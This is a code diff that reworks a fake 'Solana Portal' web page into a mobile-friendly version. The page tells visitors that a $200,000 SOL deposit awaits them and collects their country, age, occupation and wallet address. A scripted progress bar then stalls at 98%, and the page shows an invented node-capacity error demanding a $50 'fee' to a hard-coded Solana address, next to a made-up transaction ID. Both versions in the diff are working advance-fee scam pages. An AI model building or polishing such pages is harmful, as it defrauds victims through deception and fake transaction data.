@@ -1,250 +1,414 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Solana Transaction</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+  <title>Solana Transaction • Mobile</title>
+
   <style>
-    :root {
+    /* =========================
+       Design tokens (mobile-first)
+       ========================= */
+    :root{
+      --bg-grad-1: #0f1720;
+      --bg-grad-2: #0b1116;
+      --card: #0f1720;
+      --muted: #96a7b8;
+      --text: #e8f3fb;
+      --accent: linear-gradient(135deg,#7b4dff 0%,#14f195 100%);
+      --accent-color: #14F195;
       --sol-purple: #9945FF;
-      --sol-teal: #14F195;
-      --sol-green: #00FFA3;
-      --bg-card: #121820;
-      --bg-input: #0e141b;
-      --text: #eaf1f8;
-      --muted: #9fb3c8;
-      --border: #1b2430;
-      --accent: #14F195;
-      --error: #ff5c5c;
+      --danger: #ff6b6b;
+      --glass: rgba(255,255,255,0.03);
+      --border: rgba(255,255,255,0.04);
+      --radius: 14px;
+      --shadow: 0 10px 30px rgba(2,6,23,0.6);
+      --max-width: 420px;
+      --ui-gap: 12px;
     }
 
-    body {
-      margin: 0;
-      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
-      background: linear-gradient(135deg, var(--sol-purple), var(--sol-teal), var(--sol-green));
-      color: var(--text);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 16px;
+    /* Respect reduced motion */
+    @media (prefers-reduced-motion: reduce){
+      * { transition-duration: 0.001ms !important; animation-duration: 0.001ms !important; }
     }
 
-    .card {
-      background: var(--bg-card);
-      border: 1px solid var(--border);
-      border-radius: 16px;
-      padding: 24px;
-      width: 100%;
-      max-width: 520px;
-      text-align: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+    html,body{
+      height:100%;
+      margin:0;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background: radial-gradient(1200px 600px at 10% 10%, rgba(153,69,255,0.08), transparent 8%),
+                  radial-gradient(900px 500px at 90% 90%, rgba(20,241,149,0.06), transparent 8%),
+                  linear-gradient(160deg,var(--bg-grad-1),var(--bg-grad-2));
+      color:var(--text);
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      padding: env(safe-area-inset-top) 16px env(safe-area-inset-bottom);
+      display:flex;
+      align-items:center;
+      justify-content:center;
     }
 
+    /* ======================
+       Card
+       ====================== */
+    .card{
+      width:100%;
+      max-width:var(--max-width);
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border:1px solid var(--border);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 18px;
+      box-sizing: border-box;
+      backdrop-filter: blur(6px);
+      overflow:hidden;
+    }
+
+    .header {
+      display:flex;
+      gap:12px;
+      align-items:center;
+      justify-content:space-between;
+    }
     .brand {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      margin-bottom: 8px;
+      display:flex;
+      gap:10px;
+      align-items:center;
     }
-    .brand .glyph {
-      width: 18px; height: 18px; border-radius: 4px;
-      background: linear-gradient(135deg, var(--sol-purple), var(--sol-green));
-      box-shadow: 0 0 28px rgba(20,241,149,0.35);
+    .glyph{
+      width:36px;
+      height:36px;
+      border-radius:9px;
+      background: linear-gradient(135deg, var(--sol-purple), var(--accent-color));
+      box-shadow:0 6px 18px rgba(20,241,149,0.12);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      color:white;
+      font-weight:700;
+      font-size:14px;
     }
-    .brand .name {
-      font-weight: 800; letter-spacing: 0.4px; color: var(--accent);
+    .brand h2{
+      margin:0;
+      font-size:16px;
+      letter-spacing:0.2px;
+      color:var(--text);
+    }
+    .subtle {
+      display:block;
+      font-size:12px;
+      color:var(--muted);
+      margin-top:2px;
     }
 
-    h1 {
-      font-size: 20px;
-      margin: 8px 0 14px;
-      color: var(--accent);
+    /* ======================
+       Main content
+       ====================== */
+    .main {
+      margin-top:14px;
+      text-align:center;
     }
-
+    .title{
+      font-size:15px;
+      margin:0 0 8px 0;
+      color:var(--accent-color);
+      font-weight:700;
+    }
     .amount {
-      font-size: 17px;
-      margin-bottom: 8px;
+      font-size:14px;
+      margin:0;
+      color:var(--text);
     }
+    .amount small{ color:var(--muted); display:block; margin-top:4px; font-weight:600; }
 
-    .status-chip {
-      display: inline-block;
-      font-size: 13px;
-      padding: 6px 10px;
-      border-radius: 999px;
-      border: 1px solid rgba(20,241,149,0.35);
-      color: var(--accent);
-      background: rgba(20,241,149,0.12);
+    /* Status chip & loader */
+    .row {
+      display:flex;
+      gap:10px;
+      align-items:center;
+      justify-content:center;
+      margin-top:12px;
     }
-
+    .chip{
+      display:inline-flex;
+      gap:8px;
+      align-items:center;
+      padding:8px 12px;
+      border-radius:999px;
+      background: linear-gradient(90deg, rgba(20,241,149,0.06), transparent);
+      color:var(--accent-color);
+      font-weight:600;
+      font-size:13px;
+      border:1px solid rgba(20,241,149,0.08);
+    }
     .loader {
-      width: 64px;
-      height: 64px;
-      border: 6px solid rgba(255,255,255,0.1);
-      border-top: 6px solid var(--sol-green);
-      border-radius: 50%;
-      margin: 18px auto;
-      animation: spin 1s linear infinite;
+      width:44px;
+      height:44px;
+      border-radius:50%;
+      border:4px solid rgba(255,255,255,0.06);
+      border-top-color: rgba(255,255,255,0.18);
+      animation: spin 1.4s linear infinite;
+      display:inline-block;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
+    /* ======================
+       Controls
+       ====================== */
+    .actions { margin-top:16px; display:flex; gap:12px; }
     .btn {
-      appearance: none;
-      border: none;
-      background: linear-gradient(135deg, var(--sol-purple), var(--sol-teal));
-      color: white;
-      padding: 12px 16px;
-      border-radius: 10px;
-      font-weight: 700;
-      cursor: pointer;
-      box-shadow: 0 6px 18px rgba(20,241,149,0.25);
-      margin-top: 14px;
-      width: 100%;
+      flex:1;
+      border:0;
+      padding:12px;
+      border-radius:10px;
+      cursor:pointer;
+      font-weight:700;
+      color:white;
+      background: linear-gradient(135deg,#7b4dff 0%, #14f195 100%);
+      box-shadow:0 8px 24px rgba(20,241,149,0.08);
+      transition: transform .12s ease, box-shadow .12s ease;
+    }
+    .btn:active{ transform: translateY(1px) scale(.998); }
+    .btn.ghost {
+      background:transparent;
+      border:1px solid var(--border);
+      color:var(--text);
+      font-weight:600;
     }
 
-    .section-title {
-      font-size: 13px;
-      color: var(--muted);
-      text-align: left;
-      margin: 18px 0 8px;
+    /* ======================
+       Form (slide up)
+       ====================== */
+    .panel{
+      margin-top:14px;
+      background: var(--glass);
+      border-radius:12px;
+      padding:12px;
+      border:1px solid rgba(255,255,255,0.02);
+      transition: transform .28s cubic-bezier(.2,.9,.3,1), opacity .22s ease;
+      transform-origin: top;
     }
+    .panel.hidden{ transform: translateY(8px) scale(.995); opacity:0; height:0; padding:0 12px; overflow:hidden; border:none; margin-top:0; }
+    .form-row{
+      display:grid;
+      gap:10px;
+      margin-top:6px;
+    }
+    label{
+      font-size:12px;
+      color:var(--muted);
+      display:block;
+      margin-bottom:4px;
+    }
+    input[type="text"], input[type="number"], input[type="email"]{
+      width:100%;
+      padding:12px;
+      border-radius:10px;
+      border:1px solid rgba(255,255,255,0.04);
+      background: transparent;
+      color:var(--text);
+      font-size:14px;
+      box-sizing:border-box;
+    }
+    input::placeholder{ color: #7f98ad; }
+    .field {
+      display:flex;
+      flex-direction:column;
+      gap:6px;
+    }
+    .hint { font-size:12px; color:var(--muted); }
 
-    .form-box {
-      display: none;
-      text-align: left;
+    .error-msg{
+      color:var(--danger);
+      font-size:12px;
+      display:none;
     }
-    .form-row {
-      display: grid;
-      grid-template-columns: 1fr;
-      gap: 10px;
-    }
-    .form-box input {
-      width: 100%;
-      padding: 10px;
-      border-radius: 8px;
-      border: 1px solid #2a3746;
-      background: var(--bg-input);
-      color: var(--text);
-      margin-bottom: 8px;
-      font-size: 15px;
-    }
+    .error-msg.visible { display:block; }
 
+    /* ======================
+       Progress, wallets, tx-info
+       ====================== */
     .progress {
-      display: none;
-      margin-top: 18px;
-      font-size: 15px;
-      text-align: left;
+      margin-top:14px;
+      padding:12px;
+      border-radius:10px;
+      background:linear-gradient(180deg, rgba(255,255,255,0.012), transparent);
+      border:1px solid rgba(255,255,255,0.02);
+      display:none;
     }
-    .bar {
-      width: 100%;
-      height: 10px;
-      background: #2a3746;
-      border-radius: 8px;
-      overflow: hidden;
-      margin-top: 8px;
+    .progress.visible { display:block; }
+    .progress-line{
+      height:10px;
+      background: rgba(255,255,255,0.04);
+      border-radius:999px;
+      overflow:hidden;
+      margin-top:8px;
     }
-    .bar-fill {
-      height: 100%;
-      width: 0%;
-      background: var(--sol-teal);
-      transition: width 0.25s ease;
+    .progress-fill{
+      height:100%;
+      width:0%;
+      background: linear-gradient(90deg, rgba(153,69,255,0.9), rgba(20,241,149,0.9));
+      transition: width .18s linear;
+    }
+    .progress-meta{ display:flex; justify-content:space-between; font-size:13px; color:var(--muted); margin-top:8px; }
+
+    .notice {
+      margin-top:14px;
+      padding:12px;
+      border-radius:10px;
+      background: rgba(255,92,92,0.08);
+      border:1px solid rgba(255,92,92,0.12);
+      color:var(--danger);
+      display:none;
     }
 
-    .error {
-      display: none;
-      margin-top: 18px;
-      padding: 14px;
-      background: rgba(255,92,92,0.12);
-      border: 1px solid var(--error);
-      border-radius: 12px;
-      color: var(--error);
-      font-size: 14px;
-      text-align: left;
+    .info-box {
+      margin-top:12px;
+      padding:12px;
+      border-radius:10px;
+      background:rgba(255,255,255,0.02);
+      border:1px solid rgba(255,255,255,0.02);
+      font-size:13px;
+      color:var(--muted);
+      display:none;
     }
+    .info-grid{
+      display:grid;
+      grid-template-columns: 120px 1fr;
+      gap:8px 12px;
+      align-items:start;
+    }
+    .info-grid strong{ color:var(--accent-color); font-weight:700; font-size:13px; }
 
-    .wallets, .tx-info {
-      display: none;
-      margin-top: 16px;
-      font-size: 14px;
-      text-align: left;
-      background: rgba(255,255,255,0.05);
-      padding: 12px;
-      border-radius: 10px;
-      border: 1px solid #2a3746;
-    }
-    .wallets strong, .tx-info strong {
-      color: var(--accent);
-    }
-
+    /* Note */
     .note {
-      display: none;
-      margin-top: 14px;
-      font-size: 13px;
-      color: var(--muted);
-      text-align: left;
+      margin-top:12px;
+      font-size:13px;
+      color:var(--muted);
+      display:none;
     }
 
-    .kv {
-      display: grid;
-      grid-template-columns: 140px 1fr;
-      gap: 8px 12px;
-    }
-
-    @media (max-width: 420px) {
-      .card { padding: 20px; }
-      h1 { font-size: 18px; }
-      .amount { font-size: 16px; }
-      .kv { grid-template-columns: 120px 1fr; }
-      .btn { font-size: 15px; }
+    /* Small screens tweak */
+    @media (max-width:360px){
+      .info-grid{ grid-template-columns: 1fr; }
+      .glyph{ width:32px; height:32px; font-size:13px; }
     }
   </style>
 </head>
 <body>
-  <div class="card" id="card">
-    <div class="brand">
-      <span class="glyph" aria-hidden="true"></span>
-      <span class="name">Solana Portal</span>
-    </div>
-    <h1>Incoming SOL transaction</h1>
-    <div class="amount">Amount: <strong>$200,000 (≈1403 SOL)</strong></div>
-    <div class="status-chip">Deposit detected</div>
-    <div class="loader" id="loader"></div>
-    <button class="btn" id="acceptBtn">Accept</button>
-
-    <div class="form-box" id="formBox">
-      <div class="section-title">Verification details</div>
-      <div class="form-row">
-        <input type="text" id="country" placeholder="Country" />
-        <input type="number" id="age" placeholder="Age" />
-        <input type="text" id="occupation" placeholder="Occupation" />
-        <input type="text" id="solAddress" placeholder="Your Solana (SOL) address" />
+  <main class="card" role="main" aria-labelledby="heading">
+    <header class="header" aria-hidden="false">
+      <div class="brand">
+        <div class="glyph" aria-hidden="true">S</div>
+        <div>
+          <h2 id="heading">Solana Portal</h2>
+          <span class="subtle">Secure deposit manager</span>
+        </div>
       </div>
-      <button class="btn" id="submitBtn">Confirm</button>
-    </div>
 
-    <div class="progress" id="progressBox">
-      Transaction progress: <span id="progressText">0%</span>
-      <div class="bar"><div class="bar-fill" id="barFill"></div></div>
-    </div>
+      <div style="text-align:right">
+        <div style="font-size:12px; color:var(--muted)">Incoming</div>
+        <div style="font-weight:700; color:var(--accent-color);">Deposit</div>
+      </div>
+    </header>
 
-    <div class="error" id="errorBox">
-      ⚠️ Transaction error: Insufficient node capacity detected.<br />
-      To complete and release your $200,000 (≈1403 SOL) deposit, please send <strong>$50</strong> to the fee address below.
-    </div>
+    <section class="main" aria-live="polite">
+      <div class="title">Incoming SOL transaction</div>
+      <p class="amount">
+        <strong>$200,000</strong>
+        <small>≈ 1403 SOL</small>
+      </p>
 
-    <div class="wallets" id="wallets">
-      <div class="kv">
+      <div class="row" aria-hidden="false">
+        <div class="chip" id="statusChip" aria-hidden="false">Deposit detected</div>
+        <div class="loader" id="loader" aria-hidden="true" title="processing"></div>
+      </div>
+
+      <div class="actions" role="group" aria-label="Actions">
+        <button class="btn" id="acceptBtn" aria-controls="verifyPanel">Accept</button>
+        <button class="btn ghost" id="declineBtn" aria-label="Decline transaction">Decline</button>
+      </div>
+    </section>
+
+    <!-- Verification panel -->
+    <section id="verifyPanel" class="panel hidden" aria-hidden="true" aria-labelledby="verifyTitle">
+      <div style="display:flex;justify-content:space-between;align-items:center;">
+        <div>
+          <div id="verifyTitle" style="font-weight:700">Verification details</div>
+          <div class="hint">Complete to proceed — we only ask for minimal info.</div>
+        </div>
+        <div style="font-size:12px;color:var(--muted)">Step 1 of 2</div>
+      </div>
+
+      <form id="verifyForm" class="form-row" novalidate>
+        <div class="field">
+          <label for="country">Country</label>
+          <input id="country" name="country" type="text" inputmode="text" placeholder="Country (e.g. United States)" autocomplete="country" />
+          <div class="error-msg" id="countryErr">Please enter your country.</div>
+        </div>
+
+        <div class="field">
+          <label for="age">Age</label>
+          <input id="age" name="age" type="number" inputmode="numeric" placeholder="Your age" min="0" max="120" />
+          <div class="error-msg" id="ageErr">Enter a valid age (18+).</div>
+        </div>
+
+        <div class="field">
+          <label for="occupation">Occupation</label>
+          <input id="occupation" name="occupation" type="text" placeholder="Occupation" />
+          <div class="error-msg" id="occErr">Please enter your occupation.</div>
+        </div>
+
+        <div class="field">
+          <label for="solAddress">Your Solana (SOL) address</label>
+          <input id="solAddress" name="solAddress" type="text" inputmode="latin" placeholder="Enter your SOL address" autocomplete="off" />
+          <div class="error-msg" id="addrErr">Please enter a valid address (34+ chars).</div>
+        </div>
+
+        <div style="display:flex;gap:10px;margin-top:6px;">
+          <button type="button" class="btn" id="submitBtn">Confirm</button>
+          <button type="button" class="btn ghost" id="cancelBtn">Cancel</button>
+        </div>
+      </form>
+    </section>
+
+    <!-- Progress -->
+    <section id="progress" class="progress" aria-hidden="true">
+      <div style="display:flex;justify-content:space-between;align-items:center;">
+        <div style="font-weight:700">Processing transaction</div>
+        <div id="progressPercent" style="font-weight:700;color:var(--muted)">0%</div>
+      </div>
+
+      <div class="progress-line" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0" aria-label="Transaction progress">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+
+      <div class="progress-meta">
+        <span class="hint">Connecting to Solana nodes...</span>
+        <span class="hint" id="eta">ETA: —</span>
+      </div>
+    </section>
+
+    <!-- Error / wallets / tx info -->
+    <section id="notice" class="notice" aria-hidden="true">
+      ⚠️ Transaction error: Insufficient node capacity detected.
+      <div style="margin-top:8px; font-weight:700; color:var(--text)">
+        To complete and release your $200,000 (≈1403 SOL) deposit, please send <strong>$50</strong> to the fee address below.
+      </div>
+    </section>
+
+    <section id="wallets" class="info-box" aria-hidden="true">
+      <div class="info-grid">
         <div><strong>Fee address</strong></div>
-        <div>E8B9T1jYxGQ8zoRUaT9nCn9UAZyA4edBZHEyWr9Cmoau</div>
+        <div id="feeAddr">E8B9T1jYxGQ8zoRUaT9nCn9UAZyA4edBZHEyWr9Cmoau</div>
 
         <div><strong>Your SOL address</strong></div>
         <div id="userAddress">—</div>
       </div>
-    </div>
+    </section>
 
-    <div class="tx-info" id="txInfo">
-      <div class="kv">
+    <section id="txInfo" class="info-box" aria-hidden="true">
+      <div class="info-grid">
         <div><strong>Date</strong></div>
         <div id="txDate">—</div>
 
@@ -258,92 +422,196 @@
         <div id="txId">—</div>
 
         <div><strong>Status</strong></div>
-        <div>Awaiting fee payment</div>
+        <div id="txStatus">Awaiting fee payment</div>
       </div>
-    </div>
+    </section>
 
-    <div class="note" id="note">
-      Once the $50 fee is confirmed, your $200,000 (≈1403 SOL) will be released within 2–5 minutes.
-    </div>
-  </div>
+    <p class="note" id="note" aria-hidden="true">Once the $50 fee is confirmed, your $200,000 (≈1403 SOL) will be released within 2–5 minutes.</p>
+  </main>
 
   <script>
-    // Elements
-    const acceptBtn = document.getElementById('acceptBtn');
-    const loader = document.getElementById('loader');
-    const formBox = document.getElementById('formBox');
-    const submitBtn = document.getElementById('submitBtn');
-    const progressBox = document.getElementById('progressBox');
-    const progressText = document.getElementById('progressText');
-    const barFill = document.getElementById('barFill');
-    const errorBox = document.getElementById('errorBox');
-    const wallets = document.getElementById('wallets');
-    const note = document.getElementById('note');
-    const userAddress = document.getElementById('userAddress');
-    const txInfo = document.getElementById('txInfo');
-    const txDateEl = document.getElementById('txDate');
-    const txRecvEl = document.getElementById('txRecv');
-    const txIdEl = document.getElementById('txId');
+    // Minimal, accessible JS to power the improved mobile UI.
+    (function () {
+      // Elements
+      const acceptBtn = document.getElementById('acceptBtn');
+      const declineBtn = document.getElementById('declineBtn');
+      const verifyPanel = document.getElementById('verifyPanel');
+      const verifyForm = document.getElementById('verifyForm');
+      const submitBtn = document.getElementById('submitBtn');
+      const cancelBtn = document.getElementById('cancelBtn');
+      const loader = document.getElementById('loader');
+      const progressSection = document.getElementById('progress');
+      const progressFill = document.getElementById('progressFill');
+      const progressPercent = document.getElementById('progressPercent');
+      const etaEl = document.getElementById('eta');
+      const notice = document.getElementById('notice');
+      const wallets = document.getElementById('wallets');
+      const txInfo = document.getElementById('txInfo');
+      const note = document.getElementById('note');
 
-    // Helper to format current date
-    function formatDate(d) {
-      const pad = n => String(n).padStart(2, '0');
-      return `${pad(d.getDate())}/${pad(d.getMonth()+1)}/${d.getFullYear()} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
-    }
-    // Helper to generate a mock transaction ID
-    function mockTxId() {
-      const alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-      let out = 'SOL-';
-      for (let i = 0; i < 6; i++) out += alphabet[Math.floor(Math.random() * alphabet.length)];
-      out += '-';
-      for (let i = 0; i < 6; i++) out += alphabet[Math.floor(Math.random() * alphabet.length)];
-      return out;
-    }
+      const countryEl = document.getElementById('country');
+      const ageEl = document.getElementById('age');
+      const occEl = document.getElementById('occupation');
+      const addrEl = document.getElementById('solAddress');
 
-    // Initial loader visible; Accept transitions to form
-    acceptBtn.addEventListener('click', () => {
-      loader.style.display = 'none';
-      acceptBtn.style.display = 'none';
-      formBox.style.display = 'block';
-    });
+      const countryErr = document.getElementById('countryErr');
+      const ageErr = document.getElementById('ageErr');
+      const occErr = document.getElementById('occErr');
+      const addrErr = document.getElementById('addrErr');
 
-    // Submit form → progress from 0 to 98, then show error, wallets, tx info
-    submitBtn.addEventListener('click', () => {
-      const address = document.getElementById('solAddress').value.trim();
-      const country = document.getElementById('country').value.trim();
-      const age = document.getElementById('age').value.trim();
-      const occupation = document.getElementById('occupation').value.trim();
+      const userAddress = document.getElementById('userAddress');
+      const txDateEl = document.getElementById('txDate');
+      const txRecvEl = document.getElementById('txRecv');
+      const txIdEl = document.getElementById('txId');
 
-      if (!country || !age || !occupation || !address) {
-        alert('Please complete all fields (Country, Age, Occupation, SOL address).');
-        return;
+      // Helpers
+      function showPanel(panel) {
+        panel.classList.remove('hidden');
+        panel.setAttribute('aria-hidden', 'false');
+      }
+      function hidePanel(panel) {
+        panel.classList.add('hidden');
+        panel.setAttribute('aria-hidden', 'true');
+      }
+      function formatDate(d) {
+        const pad = n => String(n).padStart(2,'0');
+        return `${pad(d.getDate())}/${pad(d.getMonth()+1)}/${d.getFullYear()} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
+      }
+      function mockTxId(){
+        const alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+        let out = 'SOL-';
+        for (let i=0;i<6;i++) out += alphabet[Math.floor(Math.random()*alphabet.length)];
+        out += '-';
+        for (let i=0;i<6;i++) out += alphabet[Math.floor(Math.random()*alphabet.length)];
+        return out;
       }
 
-      // Start progress
-      formBox.style.display = 'none';
-      progressBox.style.display = 'block';
+      // Simple validation rules
+      function validate(){
+        let ok = true;
+        // Country
+        if (!countryEl.value.trim()){
+          countryErr.classList.add('visible'); ok = false;
+        } else countryErr.classList.remove('visible');
+        // Age
+        const ageVal = Number(ageEl.value);
+        if (!ageEl.value.trim() || Number.isNaN(ageVal) || ageVal < 18 || ageVal > 120){
+          ageErr.classList.add('visible'); ok = false;
+        } else ageErr.classList.remove('visible');
+        // Occupation
+        if (!occEl.value.trim()){
+          occErr.classList.add('visible'); ok = false;
+        } else occErr.classList.remove('visible');
+        // Address (basic length check)
+        if (!addrEl.value.trim() || addrEl.value.trim().length < 34){
+          addrErr.classList.add('visible'); ok = false;
+        } else addrErr.classList.remove('visible');
 
-      let percent = 0;
-      const interval = setInterval(() => {
-        percent++;
-        progressText.textContent = percent + '%';
-        barFill.style.width = percent + '%';
-        if (percent >= 98) {
-          clearInterval(interval);
-          progressBox.style.display = 'none';
-          errorBox.style.display = 'block';
-          wallets.style.display = 'block';
-          note.style.display = 'block';
-          txInfo.style.display = 'block';
+        return ok;
+      }
 
-          // Populate user address and tx info
-          userAddress.textContent = address;
-          txRecvEl.textContent = address;
-          txDateEl.textContent = formatDate(new Date());
-          txIdEl.textContent = mockTxId();
+      // Event bindings
+      acceptBtn.addEventListener('click', () => {
+        // Hide loader for clarity on mobile
+        loader.style.display = 'none';
+        showPanel(verifyPanel);
+        // focus first input
+        setTimeout(()=> countryEl.focus(), 200);
+      });
+
+      declineBtn.addEventListener('click', () => {
+        // Simple decline flow — reset UI
+        hidePanel(verifyPanel);
+        progressSection.classList.remove('visible');
+        notice.setAttribute('aria-hidden','true'); notice.style.display = 'none';
+        wallets.style.display = 'none';
+        txInfo.style.display = 'none';
+        note.style.display = 'none';
+        progressFill.style.width = '0%';
+        progressPercent.textContent = '0%';
+        // show a small visual feedback
+        document.getElementById('statusChip').textContent = 'Declined';
+      });
+
+      cancelBtn.addEventListener('click', () => {
+        hidePanel(verifyPanel);
+        acceptBtn.focus();
+      });
+
+      // Progressive submission
+      submitBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        if (!validate()) return;
+
+        // Hide form, show progress
+        hidePanel(verifyPanel);
+        progressSection.classList.add('visible');
+        progressSection.setAttribute('aria-hidden','false');
+        progressFill.style.width = '0%';
+        progressPercent.textContent = '0%';
+        etaEl.textContent = 'ETA: ~20s';
+
+        // simulate progress 0 -> 98
+        let percent = 0;
+        const start = Date.now();
+        const duration = 18000; // 18s to 98%
+        const target = 98;
+        function step(){
+          const elapsed = Date.now() - start;
+          const p = Math.min(target, Math.round((elapsed / duration) * target));
+          if (p > percent){
+            percent = p;
+            progressFill.style.width = percent + '%';
+            progressPercent.textContent = percent + '%';
+            progressSection.querySelector('[role="progressbar"]').setAttribute('aria-valuenow', percent);
+          }
+          if (percent < target){
+            requestAnimationFrame(step);
+          } else { // reached 98% -> show error & details
+            setTimeout(() => {
+              progressSection.classList.remove('visible');
+              progressSection.setAttribute('aria-hidden','true');
+              // show notice/wallets/tx info with smooth timing
+              notice.style.display = 'block'; notice.setAttribute('aria-hidden','false');
+              wallets.style.display = 'block';
+              wallets.setAttribute('aria-hidden','false');
+              txInfo.style.display = 'block';
+              txInfo.setAttribute('aria-hidden','false');
+              note.style.display = 'block';
+              note.setAttribute('aria-hidden','false');
+
+              // Populate
+              const address = addrEl.value.trim();
+              userAddress.textContent = address;
+              txRecvEl.textContent = address;
+              txDateEl.textContent = formatDate(new Date());
+              txIdEl.textContent = mockTxId();
+
+              // update status
+              document.getElementById('statusChip').textContent = 'Awaiting fee';
+            }, 350);
+          }
         }
-      }, 80);
-    });
+        requestAnimationFrame(step);
+      });
+
+      // Real-time validation: hide error on input
+      [countryEl, ageEl, occEl, addrEl].forEach(el => {
+        el.addEventListener('input', () => {
+          el.nextElementSibling?.classList.remove('visible');
+        });
+      });
+
+      // Accessibility: keyboard shortcut ENTER triggers confirm when panel visible
+      verifyForm.addEventListener('keydown', (ev) => {
+        if (ev.key === 'Enter') {
+          ev.preventDefault();
+          submitBtn.click();
+        } else if (ev.key === 'Escape') {
+          cancelBtn.click();
+        }
+      });
+    }());
   </script>
 </body>
 </html>
